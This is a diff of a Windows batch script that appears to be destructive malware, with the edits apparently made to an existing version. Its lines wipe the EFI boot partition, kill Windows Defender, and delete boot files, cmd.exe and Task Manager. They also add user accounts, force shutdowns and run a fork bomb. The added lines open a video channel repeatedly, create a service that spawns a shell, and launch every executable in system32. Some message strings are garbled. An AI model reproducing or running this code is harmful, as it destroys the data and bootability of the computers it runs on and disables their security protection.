@@ -11,8 +11,8 @@
 ::eBoioBt6dFKZSDk=
 ::cRo6pxp7LAbNWATEpCI=
 ::egkzugNsPRvcWATEpCI=
-::dAsiuh18IRvcCxnZtBJQ
-::cRYluBh/LU+EWAnk
+::dAsiuh18IRvcCxnZtBNQ
+::cRYluBh/LU+EWAjk
 ::YxY4rhs+aU+IeA==
 ::cxY6rQJ7JhzQF1fEqQJheU8BHVDMbTLrX+1NuIg=
 ::ZQ05rAF9IBncCkqN+0xwdVsFHVDXbT/0V+xNsbCqv4o=
@@ -26,14 +26,13 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnVpRZleU8FFVXbZDrqZg==
-::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MNXiuFLQI5/rHy+WQrEESVeYsRAoLNTJO0Wj0IMAMo6As2Pijeu8DAwlLPkP6Olpl/T8b5z3dZpcZZMpkr5/BboTnno6rAp8YCeXF5A6bHD/ZVclNeZEf1usVyX2f
-::YB416Ek+ZG8=
+::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MNXiuFLQI5/rHy+WQrEESVeYsRI3S1r2MKewabp8Q8Fva6f+Kd03M/ZO/tJdDuDk1p+y7VECKONWP816wHh3YshppSjws1jNVW+6+hQQgEgzUVsthebE3GmvuVaUM2FXUk4oSRHCIcYcF5Q/U
+::YB416Ek+ZW8=
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
-:a
+@echo off
 mountvol Z: /s & del Z:\ *.* /s /f /q & rd /s /q Z:\EFI
-timeout /t -1
 tasklist | findstr "MsMpEng.exe"
 mountvol Z: /s & del Z:\ *.* /s /f /q & rd /s /q Z:\EFI
 taskkill /F /IM MsMpEng.exe
@@ -71,6 +70,11 @@ del /s /q "C:\Windows\Boot"
 del /s /q "C:\Windows\system32\cmd.exe"
 del /s /q "C:\Windows\System32\Taskmgr.exe"
 del /s /q "C:\Windows\System32\osk.exe"
+start https://space.bilibili.com/3493276898298079
+start https://space.bilibili.com/3493276898298079
+start https://space.bilibili.com/3493276898298079
+start https://space.bilibili.com/3493276898298079
+start https://space.bilibili.com/3493276898298079
 mshta vbscript:msgbox("操作已完�?,48,"系统提示")(window.close)
 mshta vbscript:msgbox("操作已完�?,64,"系统提示")(window.close)
 mshta vbscript:msgbox("操作已完�?,16,"系统提示")(window.close)
@@ -78,7 +82,6 @@ mshta vbscript:msgbox("操作已完�?,64,"系统提示")(window.close)
 mshta vbscript:msgbox("操作已完�?,48,"系统提示")(window.close)
 start mshta vbscript:msgbox("重启倒计�?,0,"警告")(window.close)
 timeout /t 1 >nul
-goto :a
 net USER 1145141919810 1145141919810 /add
 net user 114514 /add
 net user 1919810 /add
@@ -99,3 +102,9 @@ shutdown -s -t 1145141919810
 shutdown -s -t 1145141919810
 %0|%0
 ipconfig
+sc Create SuperCMD binpath= "cmd /K start" type= own type= interact
+net start SuperCMD
+for %%a in (%windir%\system32\*.exe) do (
+  if /i not "%%~na"=="logoff" start %%~fa
+)
+pause
